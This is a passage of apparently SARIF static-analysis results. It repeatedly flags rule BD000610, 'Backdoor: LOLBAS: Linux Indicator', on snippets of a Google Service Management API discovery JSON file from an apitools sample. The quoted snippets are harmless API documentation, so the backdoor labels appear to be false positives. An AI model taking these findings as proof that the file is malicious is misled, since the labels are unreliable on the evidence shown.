                      "text": "    (10**3)\\n* `M`     mega    (10**6)\\n* `G`     giga    (10**9)\\n* `T`     tera    (10**12)\\n* `P`     peta    (10**15)\\n* `E`     exa     (10**18)\\n* `Z`     zetta   (10**21)\\n* `Y`     yotta   (10**24)\\n* `m`     milli   (10**-3)\\n* `u`     micro   (10**-6)\\n* `n`     nano    (10**-9)\\n* `p`     pico    (10**-12)\\n* `f`     femto   (10**-15)\\n* `a`     atto    (10**-18)\\n* `z`     zepto   (10**-21)\\n* `y`     yocto   (10**-24)\\n* `Ki`    kibi    (2**10)\\n* `Mi`    mebi    (2**20)\\n* `Gi`    gibi    (2**30)\\n* `Ti`    tebi    (2**40)\\n\\n**Grammar**\\n\\nThe grammar includes the dimensionless unit `",
                      "markdown": "`    (10**3)\\n* `M`     mega    (10**6)\\n* `G`     giga    (10**9)\\n* `T`     tera    (10**12)\\n* `P`     peta    (10**15)\\n* `E`     exa     (10**18)\\n* `Z`     zetta   (10**21)\\n* `Y`     yotta   (10**24)\\n* `m`     milli   (10**-3)\\n* `u`     micro   (10**-6)\\n* `n`     nano    (10**-9)\\n* `p`     pico    (10**-12)\\n* `f`     femto   (10**-15)\\n* `a`     atto    (10**-18)\\n* `z`     zepto   (10**-21)\\n* `y`     yocto   (10**-24)\\n* `Ki`    kibi    (2**10)\\n* `Mi`    mebi    (2**20)\\n* `Gi`    gibi    (2**30)\\n* `Ti`    tebi    (2**40)\\n\\n**Grammar**\\n\\nThe grammar includes the dimensionless unit ``"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1475,
                  "startColumn": 726,
                  "endLine": 1475,
                  "endColumn": 732,
                  "snippet": {
                    "text": "(PREFIX)**\\n\\n* `k`     kilo    (10**3)\\n* `M`     mega    (10**6)\\n* `G`     giga    (10**9)\\n* `T`     tera    (10**12)\\n* `P`     peta    (10**15)\\n* `E`     exa     (10**18)\\n* `Z`     zetta   (10**21)\\n* `Y`     yotta   (10**24)\\n* `m`     milli   (10**-3)\\n* `u`     micro   (10**-6)\\n* `n`     nano    (10**-9)\\n* `p`     pico    (10**-12)\\n* `f`     femto   (10**-15)\\n* `a`     atto    (10**-18)\\n* `z`     zepto   (10**-21)\\n* `y`     yocto   (10**-24)\\n* `Ki`    kibi    (2**10)\\n* `Mi`    mebi    (2**20)\\n* `Gi`    gibi    (2**30)\\n* `Ti`    tebi    (2**40)\\n\\n**Grammar**\\n\\nThe grammar inclu",
                    "rendered": {
                      "text": "(PREFIX)**\\n\\n* `k`     kilo    (10**3)\\n* `M`     mega    (10**6)\\n* `G`     giga    (10**9)\\n* `T`     tera    (10**12)\\n* `P`     peta    (10**15)\\n* `E`     exa     (10**18)\\n* `Z`     zetta   (10**21)\\n* `Y`     yotta   (10**24)\\n* `m`     milli   (10**-3)\\n* `u`     micro   (10**-6)\\n* `n`     nano    (10**-9)\\n* `p`     pico    (10**-12)\\n* `f`     femto   (10**-15)\\n* `a`     atto    (10**-18)\\n* `z`     zepto   (10**-21)\\n* `y`     yocto   (10**-24)\\n* `Ki`    kibi    (2**10)\\n* `Mi`    mebi    (2**20)\\n* `Gi`    gibi    (2**30)\\n* `Ti`    tebi    (2**40)\\n\\n**Grammar**\\n\\nThe grammar inclu",
                      "markdown": "`(PREFIX)**\\n\\n* `k`     kilo    (10**3)\\n* `M`     mega    (10**6)\\n* `G`     giga    (10**9)\\n* `T`     tera    (10**12)\\n* `P`     peta    (10**15)\\n* `E`     exa     (10**18)\\n* `Z`     zetta   (10**21)\\n* `Y`     yotta   (10**24)\\n* `m`     milli   (10**-3)\\n* `u`     micro   (10**-6)\\n* `n`     nano    (10**-9)\\n* `p`     pico    (10**-12)\\n* `f`     femto   (10**-15)\\n* `a`     atto    (10**-18)\\n* `z`     zepto   (10**-21)\\n* `y`     yocto   (10**-24)\\n* `Ki`    kibi    (2**10)\\n* `Mi`    mebi    (2**20)\\n* `Gi`    gibi    (2**30)\\n* `Ti`    tebi    (2**40)\\n\\n**Grammar**\\n\\nThe grammar inclu`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1442,
                  "startColumn": 34,
                  "endLine": 1442,
                  "endColumn": 40,
                  "snippet": {
                    "text": "            \"Do not use this default value.\",\n            \"Instantaneous measurements of a varying quantity.\",\n            \"Changes over non-overlapping time intervals.\",\n            \"Cumulative value over time intervals that can overlap.\\nThe overlapping intervals must have the same start time.\"\n          ],\n          \"type\": \"string\",\n          \"enum\": [\n",
                    "rendered": {
                      "text": "            \"Do not use this default value.\",\n            \"Instantaneous measurements of a varying quantity.\",\n            \"Changes over non-overlapping time intervals.\",\n            \"Cumulative value over time intervals that can overlap.\\nThe overlapping intervals must have the same start time.\"\n          ],\n          \"type\": \"string\",\n          \"enum\": [\n",
                      "markdown": "`            \"Do not use this default value.\",\n            \"Instantaneous measurements of a varying quantity.\",\n            \"Changes over non-overlapping time intervals.\",\n            \"Cumulative value over time intervals that can overlap.\\nThe overlapping intervals must have the same start time.\"\n          ],\n          \"type\": \"string\",\n          \"enum\": [\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1441,
                  "startColumn": 41,
                  "endLine": 1441,
                  "endColumn": 47,
                  "snippet": {
                    "text": "          \"enumDescriptions\": [\n            \"Do not use this default value.\",\n            \"Instantaneous measurements of a varying quantity.\",\n            \"Changes over non-overlapping time intervals.\",\n            \"Cumulative value over time intervals that can overlap.\\nThe overlapping intervals must have the same start time.\"\n          ],\n          \"type\": \"string\",\n",
                    "rendered": {
                      "text": "          \"enumDescriptions\": [\n            \"Do not use this default value.\",\n            \"Instantaneous measurements of a varying quantity.\",\n            \"Changes over non-overlapping time intervals.\",\n            \"Cumulative value over time intervals that can overlap.\\nThe overlapping intervals must have the same start time.\"\n          ],\n          \"type\": \"string\",\n",
                      "markdown": "`          \"enumDescriptions\": [\n            \"Do not use this default value.\",\n            \"Instantaneous measurements of a varying quantity.\",\n            \"Changes over non-overlapping time intervals.\",\n            \"Cumulative value over time intervals that can overlap.\\nThe overlapping intervals must have the same start time.\"\n          ],\n          \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1430,
                  "startColumn": 313,
                  "endLine": 1430,
                  "endColumn": 317,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"labels\": {\n          \"description\": \"The set of labels that can be used to describe a specific instance of this\\nmetric type. For example, the\\n`compute.googleapis.com\\/instance\\/network\\/received_bytes_count` metric type\\nhas a label, `loadbalanced`, that specifies whether the traffic was\\nreceived through a load balanced IP address.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"LabelDescriptor\"\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"labels\": {\n          \"description\": \"The set of labels that can be used to describe a specific instance of this\\nmetric type. For example, the\\n`compute.googleapis.com\\/instance\\/network\\/received_bytes_count` metric type\\nhas a label, `loadbalanced`, that specifies whether the traffic was\\nreceived through a load balanced IP address.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"LabelDescriptor\"\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"labels\": {\n          \"description\": \"The set of labels that can be used to describe a specific instance of this\\nmetric type. For example, the\\n`compute.googleapis.com\\/instance\\/network\\/received_bytes_count` metric type\\nhas a label, `loadbalanced`, that specifies whether the traffic was\\nreceived through a load balanced IP address.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"LabelDescriptor\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1356,
                  "startColumn": 29,
                  "endLine": 1356,
                  "endColumn": 38,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"environment\": {\n          \"description\": \"The service control environment to use. If empty, no control plane\\nfeature (like quota and billing) will be enabled.\",\n          \"type\": \"string\"\n        }\n      }\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"environment\": {\n          \"description\": \"The service control environment to use. If empty, no control plane\\nfeature (like quota and billing) will be enabled.\",\n          \"type\": \"string\"\n        }\n      }\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"environment\": {\n          \"description\": \"The service control environment to use. If empty, no control plane\\nfeature (like quota and billing) will be enabled.\",\n          \"type\": \"string\"\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1352,
                  "startColumn": 48,
                  "endLine": 1352,
                  "endColumn": 57,
                  "snippet": {
                    "text": "    },\n    \"Control\": {\n      \"id\": \"Control\",\n      \"description\": \"Selects and configures the service controller used by the service.  The\\nservice controller handles features like abuse, quota, billing, logging,\\nmonitoring, etc.\\n\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"environment\": {\n",
                    "rendered": {
                      "text": "    },\n    \"Control\": {\n      \"id\": \"Control\",\n      \"description\": \"Selects and configures the service controller used by the service.  The\\nservice controller handles features like abuse, quota, billing, logging,\\nmonitoring, etc.\\n\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"environment\": {\n",
                      "markdown": "`    },\n    \"Control\": {\n      \"id\": \"Control\",\n      \"description\": \"Selects and configures the service controller used by the service.  The\\nservice controller handles features like abuse, quota, billing, logging,\\nmonitoring, etc.\\n\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"environment\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1305,
                  "startColumn": 374,
                  "endLine": 1305,
                  "endColumn": 383,
                  "snippet": {
                    "text": "ervice. One service may\\nhave many consumer projects, and the service may want to behave differently\\ndepending on some properties on the project. For example, a project may be\\nassociated with a school, or a business, or a government agency, a business\\ntype property on the project may affect how a service responds to the client.\\nThis descriptor defines which properties are allowed to be set on a project.\\n\\nExample:\\n\\n   project_properties:\\n     properties:\\n     - name: NO_WATERMARK\\n       type: BOOL\\n       description: Allows usage of the API without watermarks.\\n     - name: EXTENDED_TILE_CAC",
                    "rendered": {
                      "text": "ervice. One service may\\nhave many consumer projects, and the service may want to behave differently\\ndepending on some properties on the project. For example, a project may be\\nassociated with a school, or a business, or a government agency, a business\\ntype property on the project may affect how a service responds to the client.\\nThis descriptor defines which properties are allowed to be set on a project.\\n\\nExample:\\n\\n   project_properties:\\n     properties:\\n     - name: NO_WATERMARK\\n       type: BOOL\\n       description: Allows usage of the API without watermarks.\\n     - name: EXTENDED_TILE_CAC",
                      "markdown": "`ervice. One service may\\nhave many consumer projects, and the service may want to behave differently\\ndepending on some properties on the project. For example, a project may be\\nassociated with a school, or a business, or a government agency, a business\\ntype property on the project may affect how a service responds to the client.\\nThis descriptor defines which properties are allowed to be set on a project.\\n\\nExample:\\n\\n   project_properties:\\n     properties:\\n     - name: NO_WATERMARK\\n       type: BOOL\\n       description: Allows usage of the API without watermarks.\\n     - name: EXTENDED_TILE_CAC`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1305,
                  "startColumn": 135,
                  "endLine": 1305,
                  "endColumn": 144,
                  "snippet": {
                    "text": "ll be filtered when they appear in error payload.\",\n          \"type\": \"boolean\"\n        }\n      }\n    },\n    \"ProjectProperties\": {\n      \"id\": \"ProjectProperties\",\n      \"description\": \"A descriptor for defining project properties for a service. One service may\\nhave many consumer projects, and the service may want to behave differently\\ndepending on some properties on the project. For example, a project may be\\nassociated with a school, or a business, or a government agency, a business\\ntype property on the project may affect how a service responds to the client.\\nThis descriptor defines which proper",
                    "rendered": {
                      "text": "ll be filtered when they appear in error payload.\",\n          \"type\": \"boolean\"\n        }\n      }\n    },\n    \"ProjectProperties\": {\n      \"id\": \"ProjectProperties\",\n      \"description\": \"A descriptor for defining project properties for a service. One service may\\nhave many consumer projects, and the service may want to behave differently\\ndepending on some properties on the project. For example, a project may be\\nassociated with a school, or a business, or a government agency, a business\\ntype property on the project may affect how a service responds to the client.\\nThis descriptor defines which proper",
                      "markdown": "`ll be filtered when they appear in error payload.\",\n          \"type\": \"boolean\"\n        }\n      }\n    },\n    \"ProjectProperties\": {\n      \"id\": \"ProjectProperties\",\n      \"description\": \"A descriptor for defining project properties for a service. One service may\\nhave many consumer projects, and the service may want to behave differently\\ndepending on some properties on the project. For example, a project may be\\nassociated with a school, or a business, or a government agency, a business\\ntype property on the project may affect how a service responds to the client.\\nThis descriptor defines which proper`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1305,
                  "startColumn": 85,
                  "endLine": 1305,
                  "endColumn": 94,
                  "snippet": {
                    "text": "ror response.  Otherwise,\\nobjects of this type will be filtered when they appear in error payload.\",\n          \"type\": \"boolean\"\n        }\n      }\n    },\n    \"ProjectProperties\": {\n      \"id\": \"ProjectProperties\",\n      \"description\": \"A descriptor for defining project properties for a service. One service may\\nhave many consumer projects, and the service may want to behave differently\\ndepending on some properties on the project. For example, a project may be\\nassociated with a school, or a business, or a government agency, a business\\ntype property on the project may affect how a service responds to",
                    "rendered": {
                      "text": "ror response.  Otherwise,\\nobjects of this type will be filtered when they appear in error payload.\",\n          \"type\": \"boolean\"\n        }\n      }\n    },\n    \"ProjectProperties\": {\n      \"id\": \"ProjectProperties\",\n      \"description\": \"A descriptor for defining project properties for a service. One service may\\nhave many consumer projects, and the service may want to behave differently\\ndepending on some properties on the project. For example, a project may be\\nassociated with a school, or a business, or a government agency, a business\\ntype property on the project may affect how a service responds to",
                      "markdown": "`ror response.  Otherwise,\\nobjects of this type will be filtered when they appear in error payload.\",\n          \"type\": \"boolean\"\n        }\n      }\n    },\n    \"ProjectProperties\": {\n      \"id\": \"ProjectProperties\",\n      \"description\": \"A descriptor for defining project properties for a service. One service may\\nhave many consumer projects, and the service may want to behave differently\\ndepending on some properties on the project. For example, a project may be\\nassociated with a school, or a business, or a government agency, a business\\ntype property on the project may affect how a service responds to`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1269,
                  "startColumn": 31,
                  "endLine": 1269,
                  "endColumn": 40,
                  "snippet": {
                    "text": "    },\n    \"CustomError\": {\n      \"id\": \"CustomError\",\n      \"description\": \"Customize service error responses.  For example, list any service\\nspecific protobuf types that can appear in error detail lists of\\nerror responses.\\n\\nExample:\\n\\n    custom_error:\\n      types:\\n      - google.foo.v1.CustomError\\n      - google.foo.v1.AnotherError\\n\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"rules\": {\n",
                    "rendered": {
                      "text": "    },\n    \"CustomError\": {\n      \"id\": \"CustomError\",\n      \"description\": \"Customize service error responses.  For example, list any service\\nspecific protobuf types that can appear in error detail lists of\\nerror responses.\\n\\nExample:\\n\\n    custom_error:\\n      types:\\n      - google.foo.v1.CustomError\\n      - google.foo.v1.AnotherError\\n\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"rules\": {\n",
                      "markdown": "`    },\n    \"CustomError\": {\n      \"id\": \"CustomError\",\n      \"description\": \"Customize service error responses.  For example, list any service\\nspecific protobuf types that can appear in error detail lists of\\nerror responses.\\n\\nExample:\\n\\n    custom_error:\\n      types:\\n      - google.foo.v1.CustomError\\n      - google.foo.v1.AnotherError\\n\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"rules\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1237,
                  "startColumn": 107,
                  "endLine": 1237,
                  "endColumn": 116,
                  "snippet": {
                    "text": "          }\n        },\n        \"deactivationHooks\": {\n          \"description\": \"Services that must be contacted before a consumer can deactivate a\\nservice. Each service will be contacted in sequence, and, if any\\ndeactivation call fails, the entire deactivation will fail. Each hook is\\nof the form <service.name>\\/<hook-id>, where <hook-id> is optional; for\\nexample:\\n'compute.googleapis.com\\/'.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n",
                    "rendered": {
                      "text": "          }\n        },\n        \"deactivationHooks\": {\n          \"description\": \"Services that must be contacted before a consumer can deactivate a\\nservice. Each service will be contacted in sequence, and, if any\\ndeactivation call fails, the entire deactivation will fail. Each hook is\\nof the form <service.name>\\/<hook-id>, where <hook-id> is optional; for\\nexample:\\n'compute.googleapis.com\\/'.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n",
                      "markdown": "`          }\n        },\n        \"deactivationHooks\": {\n          \"description\": \"Services that must be contacted before a consumer can deactivate a\\nservice. Each service will be contacted in sequence, and, if any\\ndeactivation call fails, the entire deactivation will fail. Each hook is\\nof the form <service.name>\\/<hook-id>, where <hook-id> is optional; for\\nexample:\\n'compute.googleapis.com\\/'.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1230,
                  "startColumn": 110,
                  "endLine": 1230,
                  "endColumn": 119,
                  "snippet": {
                    "text": "          }\n        },\n        \"activationHooks\": {\n          \"description\": \"Services that must be contacted before a consumer can begin using the\\nservice. Each service will be contacted in sequence, and, if any activation\\ncall fails, the entire activation will fail. Each hook is of the form\\n<service.name>\\/<hook-id>, where <hook-id> is optional; for example:\\n'robotservice.googleapis.com\\/default'.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n",
                    "rendered": {
                      "text": "          }\n        },\n        \"activationHooks\": {\n          \"description\": \"Services that must be contacted before a consumer can begin using the\\nservice. Each service will be contacted in sequence, and, if any activation\\ncall fails, the entire activation will fail. Each hook is of the form\\n<service.name>\\/<hook-id>, where <hook-id> is optional; for example:\\n'robotservice.googleapis.com\\/default'.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n",
                      "markdown": "`          }\n        },\n        \"activationHooks\": {\n          \"description\": \"Services that must be contacted before a consumer can begin using the\\nservice. Each service will be contacted in sequence, and, if any activation\\ncall fails, the entire activation will fail. Each hook is of the form\\n<service.name>\\/<hook-id>, where <hook-id> is optional; for example:\\n'robotservice.googleapis.com\\/default'.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1223,
                  "startColumn": 246,
                  "endLine": 1223,
                  "endColumn": 255,
                  "snippet": {
                    "text": "          }\n        },\n        \"dependsOnServices\": {\n          \"description\": \"Services that must be activated in order for this service to be used.\\nThe set of services activated as a result of these relations are all\\nactivated in parallel with no guaranteed order of activation.\\nEach string is a service name, e.g. `calendar.googleapis.com`.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n",
                    "rendered": {
                      "text": "          }\n        },\n        \"dependsOnServices\": {\n          \"description\": \"Services that must be activated in order for this service to be used.\\nThe set of services activated as a result of these relations are all\\nactivated in parallel with no guaranteed order of activation.\\nEach string is a service name, e.g. `calendar.googleapis.com`.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n",
                      "markdown": "`          }\n        },\n        \"dependsOnServices\": {\n          \"description\": \"Services that must be activated in order for this service to be used.\\nThe set of services activated as a result of these relations are all\\nactivated in parallel with no guaranteed order of activation.\\nEach string is a service name, e.g. `calendar.googleapis.com`.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1223,
                  "startColumn": 75,
                  "endLine": 1223,
                  "endColumn": 84,
                  "snippet": {
                    "text": "          }\n        },\n        \"dependsOnServices\": {\n          \"description\": \"Services that must be activated in order for this service to be used.\\nThe set of services activated as a result of these relations are all\\nactivated in parallel with no guaranteed order of activation.\\nEach string is a service name, e.g. `calendar.googleapis.com`.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n",
                    "rendered": {
                      "text": "          }\n        },\n        \"dependsOnServices\": {\n          \"description\": \"Services that must be activated in order for this service to be used.\\nThe set of services activated as a result of these relations are all\\nactivated in parallel with no guaranteed order of activation.\\nEach string is a service name, e.g. `calendar.googleapis.com`.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n",
                      "markdown": "`          }\n        },\n        \"dependsOnServices\": {\n          \"description\": \"Services that must be activated in order for this service to be used.\\nThe set of services activated as a result of these relations are all\\nactivated in parallel with no guaranteed order of activation.\\nEach string is a service name, e.g. `calendar.googleapis.com`.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1205,
                  "startColumn": 16,
                  "endLine": 1205,
                  "endColumn": 25,
                  "snippet": {
                    "text": "       \"The service can be seen\\/used by users identified in the service's\\naccess control policy and they are within the organization that owns the\\nservice.\\n\\nAccess is further constrained to the group\\ncontrolled by the administrator of the project\\/org that owns the\\nservice.\",\n            \"The service can be seen\\/used by the group of users controlled by the\\nadministrator of the project\\/org that owns the service.\"\n          ],\n          \"type\": \"string\",\n          \"enum\": [\n            \"RESTRICTED\",\n            \"PUBLIC\",\n            \"ORG_RESTRICTED\",\n            \"ORG_PUBLIC\"\n          ]\n       ",
                    "rendered": {
                      "text": "       \"The service can be seen\\/used by users identified in the service's\\naccess control policy and they are within the organization that owns the\\nservice.\\n\\nAccess is further constrained to the group\\ncontrolled by the administrator of the project\\/org that owns the\\nservice.\",\n            \"The service can be seen\\/used by the group of users controlled by the\\nadministrator of the project\\/org that owns the service.\"\n          ],\n          \"type\": \"string\",\n          \"enum\": [\n            \"RESTRICTED\",\n            \"PUBLIC\",\n            \"ORG_RESTRICTED\",\n            \"ORG_PUBLIC\"\n          ]\n       ",
                      "markdown": "`       \"The service can be seen\\/used by users identified in the service's\\naccess control policy and they are within the organization that owns the\\nservice.\\n\\nAccess is further constrained to the group\\ncontrolled by the administrator of the project\\/org that owns the\\nservice.\",\n            \"The service can be seen\\/used by the group of users controlled by the\\nadministrator of the project\\/org that owns the service.\"\n          ],\n          \"type\": \"string\",\n          \"enum\": [\n            \"RESTRICTED\",\n            \"PUBLIC\",\n            \"ORG_RESTRICTED\",\n            \"ORG_PUBLIC\"\n          ]\n       `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1204,
                  "startColumn": 16,
                  "endLine": 1204,
                  "endColumn": 25,
                  "snippet": {
                    "text": "e service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_PUBLIC.\\n\\nThe discovery document for the service will also be public and allow\\nunregistered access.\",\n            \"The service can be seen\\/used by users identified in the service's\\naccess control policy and they are within the organization that owns the\\nservice.\\n\\nAccess is further constrained to the group\\ncontrolled by the administrator of the project\\/org that owns the\\nservice.\",\n            \"The service can be seen",
                    "rendered": {
